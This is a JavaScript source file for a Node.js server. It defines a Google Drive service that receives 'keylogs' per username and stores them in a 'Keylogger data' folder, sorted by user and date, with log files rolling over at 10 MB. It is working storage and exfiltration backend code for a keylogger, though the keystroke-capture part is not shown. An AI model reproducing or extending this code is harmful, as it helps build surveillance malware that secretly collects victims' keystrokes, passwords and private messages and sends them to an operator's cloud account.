import { google } from 'googleapis';
// import { JWT } from 'google-auth-library';
import { OAuth2Client } from 'google-auth-library';
import fs from 'fs';
import path from 'path';
import { root_folder } from '../server.js';

class GoogleDriveService {
    constructor() {
        this.drive = null;
        this.initializeDrive();
    }

    async initializeDrive() {
        try {
            // Load service account credentials
            // const credentials = JSON.parse(fs.readFileSync("./driveAccess.json"));
            const credentials = JSON.parse(fs.readFileSync("./oAuthCredentials.json"));
            // console.log(credentials)
            // const auth = new JWT({
            //     email: credentials.client_email,
            //     key: credentials.private_key,
            //     scopes: ['https://www.googleapis.com/auth/drive'],
            // });
            
            const oAuth2Client = new OAuth2Client(
                credentials.web.client_id,
                credentials.web.client_secret,
                credentials.web.redirect_uris[0]
            );

            const token = JSON.parse(fs.readFileSync('./token.json'));
            
            oAuth2Client.setCredentials(token);

            // this.drive = google.drive({ version: 'v3', auth });
            this.drive = google.drive({ version: 'v3', auth: oAuth2Client });
            console.log('Google Drive service initialized successfully');
        } catch (error) {
            console.error('Failed to initialize Google Drive service:', error);
            throw error;
        }
    }

    async findOrCreateFolder(parentId, folderName) {
        try {
            // Search for existing folder
            const response = await this.drive.files.list({
                q: `'${parentId}' in parents and name='${folderName}' and mimeType='application/vnd.google-apps.folder' and trashed=false`,
                fields: 'files(id, name)',
            });

            if (response.data.files.length > 0) {
                return response.data.files[0].id;
            }

            // Create new folder if not found
            const folderMetadata = {
                name: folderName,
                mimeType: 'application/vnd.google-apps.folder',
                parents: [parentId],
            };

            const folder = await this.drive.files.create({
                resource: folderMetadata,
                fields: 'id',
            });

            return folder.data.id;
        } catch (error) {
            console.error(`Error finding/creating folder ${folderName}:`, error);
            throw error;
        }
    }

    async getOrCreateUserFolder(username) {
        try {
            // First, find or create the main "keylogger data" folder
            const rootFolderId = await this.findOrCreateFolder(root_folder, 'Keylogger data');
            
            // Then find or create user folder
            const userFolderId = await this.findOrCreateFolder(rootFolderId, username);
            
            return userFolderId;
        } catch (error) {
            console.error(`Error getting user folder for ${username}:`, error);
            throw error;
        }
    }

    async getOrCreateDateFolder(userFolderId, date) {
        try {
            const dateFolderId = await this.findOrCreateFolder(userFolderId, date);
            return dateFolderId;
        } catch (error) {
            console.error(`Error getting date folder for ${date}:`, error);
            throw error;
        }
    }

    async getLatestFileInDateFolder(dateFolderId) {
        try {
            const response = await this.drive.files.list({
                q: `'${dateFolderId}' in parents and mimeType='application/json' and trashed=false`,
                orderBy: 'createdTime desc',
                pageSize: 1,
                fields: 'files(id, name, size)',
            });

            return response.data.files.length > 0 ? response.data.files[0] : null;
        } catch (error) {
            console.error('Error getting latest file:', error);
            throw error;
        }
    }

    async appendToFile(fileId, newData) {
        try {
            // Get current file content
            const file = await this.drive.files.get({
                fileId: fileId,
                alt: 'media',
            });

            let currentContent = '';
            if (file.data) {
                currentContent = file.data;
            }

            // Prepare new content to append
            const newContent = newData.map(item => JSON.stringify(item)).join('\n');
            
            // Combine existing and new content
            let updatedContent;
            if (currentContent.trim()) {
                // If there's existing content, append with a newline
                updatedContent = currentContent.trim() + '\n' + newContent;
            } else {
                // If file is empty, just use new content
                updatedContent = newContent;
            }

            // Update file
            await this.drive.files.update({
                fileId: fileId,
                media: {
                    mimeType: 'application/json',
                    body: updatedContent,
                },
            });

            return true;
        } catch (error) {
            console.error('Error appending to file:', error);
            throw error;
        }
    }

    async createNewFile(dateFolderId, data, fileIndex = 1) {
        try {
            const fileName = `logs_${fileIndex}.json`;
            const content = data.map(item => JSON.stringify(item)).join('\n');

            const fileMetadata = {
                name: fileName,
                parents: [dateFolderId],
                mimeType: 'application/json',
            };

            const file = await this.drive.files.create({
                resource: fileMetadata,
                media: {
                    mimeType: 'application/json',
                    body: content,
                },
                fields: 'id, name, size',
            });

            return file.data;
        } catch (error) {
            console.error('Error creating new file:', error);
            throw error;
        }
    }

    async saveKeylogs(username, logs) {
        try {
            if (!this.drive) {
                await this.initializeDrive();
            }

            // Get current date in YYYY-MM-DD format using local timezone
            const now = new Date();
            const currentDate = now.getFullYear() + '-' + 
                               String(now.getMonth() + 1).padStart(2, '0') + '-' + 
                               String(now.getDate()).padStart(2, '0');
            
            // Get user folder
            const userFolderId = await this.getOrCreateUserFolder(username);
            
            // Get date folder
            const dateFolderId = await this.getOrCreateDateFolder(userFolderId, currentDate);
            
            // Get latest file in date folder
            const latestFile = await this.getLatestFileInDateFolder(dateFolderId);
            
            if (latestFile) {
                // Check file size (convert from string to number)
                const fileSizeInMB = parseInt(latestFile.size) / (1024 * 1024);
                
                if (fileSizeInMB < 10) {
                    // Append to existing file
                    await this.appendToFile(latestFile.id, logs);
                    console.log(`Appended ${logs.length} logs to existing file: ${latestFile.name}`);
                } else {
                    // Create new file
                    const fileIndex = parseInt(latestFile.name.match(/logs_(\d+)\.json/)?.[1] || '0') + 1;
                    const newFile = await this.createNewFile(dateFolderId, logs, fileIndex);
                    console.log(`Created new file: ${newFile.name} with ${logs.length} logs`);
                }
            } else {
                // Create first file for this date
                const newFile = await this.createNewFile(dateFolderId, logs, 1);
                console.log(`Created first file: ${newFile.name} with ${logs.length} logs`);
            }

            return true;
        } catch (error) {
            console.error('Error saving keylogs:', error);
            throw error;
        }
    }
}

export default GoogleDriveService; 